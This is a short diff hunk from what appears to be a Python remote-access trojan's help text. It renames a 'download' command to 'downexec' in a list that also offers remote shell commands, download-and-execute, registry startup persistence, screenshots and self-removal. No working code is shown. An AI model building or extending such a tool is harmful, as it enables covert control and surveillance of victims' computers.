@@ -43,7 +43,7 @@ if __name__ == '__main__':
 	 
  Available commands:
     * shell cmd        <sends shell command>
-    * download url     <download and execute via shell>
+    * downexec url     <download and execute via shell>
     * infect           <adds itself to startup via registry>
     * screenshot       <takes screenshot>
     * removal          <remove myself>
